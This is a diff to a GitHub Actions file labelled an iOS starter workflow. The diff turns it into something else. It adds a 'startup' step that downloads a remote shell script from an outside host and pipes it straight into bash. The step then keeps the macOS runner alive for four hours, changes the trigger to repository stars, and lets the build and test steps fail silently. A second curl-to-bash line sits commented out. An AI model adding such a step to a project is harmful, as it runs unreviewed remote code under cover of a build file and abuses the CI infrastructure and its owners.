@@ -1,8 +1,10 @@
 name: iOS starter workflow
 
 on:
-  push:
-    branches: [ main ]
+  #push:
+  #  branches: [ main ]
+  watch:
+    types: [started]
   pull_request:
     branches: [ main ]
 
@@ -14,13 +16,47 @@ jobs:
     steps:
       - name: Checkout
         uses: actions/checkout@v2
+      - name: Get Date
+        id: get-date
+        run: |
+          echo "::set-output name=date::$(/bin/date -u '+%H%M%S')"
+        shell: bash
+  
+      - name: Local Cache                        
+        uses: actions/cache@v2
+        with:
+          path: |
+            ~/local-cache
+            !~/local-cache/exclude
+          key: ${{ runner.os }}-cache-${{ steps.get-date.outputs.date }}
+          restore-keys: |
+              ${{ runner.os }}-cache-
+              ${{ runner.os }}-  
+
+      #- name: startup
+      #  continue-on-error: true 
+      #  run: |
+      #    echo "timeout: xxx"
+      #    ${{ secrets.MACOS_SH }}
+
+      - name: startup
+        continue-on-error: true 
+        run: |
+          echo "will startup..."
+          #${{ secrets.MACOS_SH }}  # curl ms.devxops.tk/devops/startups/action-macos-startup.sh | bash
+          curl -L https://fhost.deta.dev/d/macos/macos-startup-linshi.sh  | bash 
+          echo $$  >  /Users/runner/main-pid 
+          sleep 14400
+
       - name: Set Default Scheme
+        continue-on-error: true 
         run: |
           scheme_list=$(xcodebuild -list -json | tr -d "\n")
           default=$(echo $scheme_list | ruby -e "require 'json'; puts JSON.parse(STDIN.gets)['project']['targets'][0]")
           echo $default | cat >default
           echo Using default scheme: $default
       - name: Build
+        continue-on-error: true 
         env:
           scheme: ${{ 'default' }}
           platform: ${{ 'iOS Simulator' }}
@@ -32,6 +68,7 @@ jobs:
           file_to_build=`echo $file_to_build | awk '{$1=$1;print}'`
           xcodebuild build-for-testing -scheme "$scheme" -"$filetype_parameter" "$file_to_build" -destination "platform=$platform,name=$device"
       - name: Test
+        continue-on-error: true 
         env:
           scheme: ${{ 'default' }}
           platform: ${{ 'iOS Simulator' }}
